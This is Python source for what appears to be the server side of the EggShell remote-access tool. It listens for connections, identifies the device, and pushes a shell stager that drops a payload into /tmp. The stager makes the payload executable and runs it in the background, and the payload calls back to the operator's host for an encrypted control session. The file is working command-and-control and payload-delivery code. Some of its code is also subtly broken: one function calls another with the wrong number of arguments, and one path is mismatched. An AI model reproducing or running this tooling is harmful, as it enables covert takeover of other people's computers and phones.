import socket, ssl, os, json, sys
import helper as h
import session
import binascii
import readline
from multihandler import MultiHandler

downloads_dir = "../downloads"

class Server:
    def __init__(self):
        if not os.path.isdir("downloads"):
            os.makedirs("downloads")
        self.host = None
        self.port = None
        self.debug = False
        self.debug_device = ""
        self.modules_macos = self.import_modules("modules/commands/macOS")
        self.modules_ios = self.import_modules("modules/commands/iOS")
        self.modules_python = self.import_modules("modules/commands/python")
        self.modules_local = self.import_modules("modules/commands/local")
        self.multihandler = None

  
    def import_modules(self,path):
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).command()
                #add module info to dictionary
                modules[m.name] = m
        return modules


    def get_modules(self,session):
        if session.type == "i386": 
            result = self.modules_macos
        elif session.type == "arm64":
            result = self.modules_ios
        else:
            result = self.modules_python
        return result


    def set_host_port(self):
        try:
            lhost = h.getip()
            lport = None
            choice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
            if choice != "":
                lhost = choice
            h.info_general("LHOST = " + lhost)
            while True:
                lport = raw_input("SET LPORT (Leave blank for 4444)>")
                if not lport:
                    lport = 4444
                try:
                    lport = int(lport)
                except ValueError:
                    h.info_general("invalid port, please enter a valid integer")
                    continue
                if lport < 1024:
                    h.info_general("invalid port, please enter a value >= 1024")
                    continue
                break
            h.info_general("LPORT = " + str(lport))
            self.host = socket.gethostbyname(lhost)
            self.port = lport
            return True
        except KeyboardInterrupt:
            return False


    def start_single_handler(self):
        session = self.listen(False)
        if session:
            session.interact()
        else:
            print "rip"


    def start_multi_handler(self):
        self.multihandler = MultiHandler(self)
        self.multihandler.start_background_server()
        self.multihandler.interact()
        print "end start multihandler"


    def craft_payload(self,device,is_multi):
        # TODO: Detect uid before we send executable
        if not self.host:
            raise ValueError('Server host not set')
        if not self.port:
            raise ValueError('Server port not set')
        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":1}))
        if device == "i386":
            if is_multi == False:
                h.info_general("Detected macOS")
            f = open("resources/esplmacos", "rb")
            payload = f.read()
            f.close()
            #save to tmp, 
            instructions = \
            "cat >/private/tmp/tmpespl;"+\
            "chmod 777 /private/tmp/tmpespl;"+\
            "killall espl 2>/dev/null;"+\
            "mv /private/tmp/tmpespl /private/tmp/espl;"+\
            "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        elif device == "arm64":
            if is_multi == False:
                h.info_general("Detected iOS")
            f = open("resources/esplios", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/tmpespl;"+\
            "chmod 777 /tmp/tmpespl;"+\
            "killall espl;"+\
            "mv /tmp/tmpespl /tmp/espl;"+\
            "/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        else:
            if is_multi == False:
                if "Linux" in device:
                    h.info_general("Detected Linux")
                elif "GET / HTTP/1.1" in device:
                    raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
                else:
                    h.info_general("Device unrecognized, trying python payload")
            f = open("resources/espl.py", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/espl.py;"+\
            "chmod 777 /var/tmp/espl.py;"+\
            "python /tmp/espl.py "+payload_parameter+" &\n"
            return (instructions,payload)


    def listen(self,is_multi):
        #craft shell script
        identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        #listen for connection
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(1)
        if is_multi == False:
            h.info_general("Listening on port "+str(self.port)+"...")

        conn, addr = s.accept()
        hostAddress = addr[0]
        if is_multi == False:
            h.info_general("Connecting to "+hostAddress)
        conn.send(identification_shell_command)
        device_type = conn.recv(128).strip()
        if not device_type:
            return

        try:
            bash_stager, executable = self.craft_payload(device_type,is_multi)
        except Exception as e:
            h.info_error(str(e))
            raw_input("Press the enter key to continue")
            return
        
        if is_multi == False:
            h.info_general("Sending Payload")
        conn.send(bash_stager)
        conn.send(executable)
        conn.close()
        if is_multi == False:
            h.info_general("Establishing Secure Connection...")
        return self.listen_for_executable_payload(s,device_type,is_multi)


    def listen_for_executable_payload(self,s,device_type,is_multi):
        # accept connection
        ssl_con, hostAddress = s.accept()
        s.settimeout(5)
        ssl_sock = ssl.wrap_socket(ssl_con,
                                 server_side=True,
                                 certfile=".keys/server.crt",
                                 keyfile=".keys/server.key",
                                 ssl_version=ssl.PROTOCOL_SSLv23)
        raw = ssl_sock.recv(256)
        device_info = json.loads(raw)
        device_info.update({
            'type': device_type,
            'is_multi': is_multi,
            })
        return session.Session(self,ssl_sock,device_info)
        

    def update_session(self,session):
        #single session
        newsession = self.listen(False,True)
        session.is_multi = newsession.is_multi
        session.term = newsession.term
        session.conn = newsession.conn
        session.name = newsession.name


   
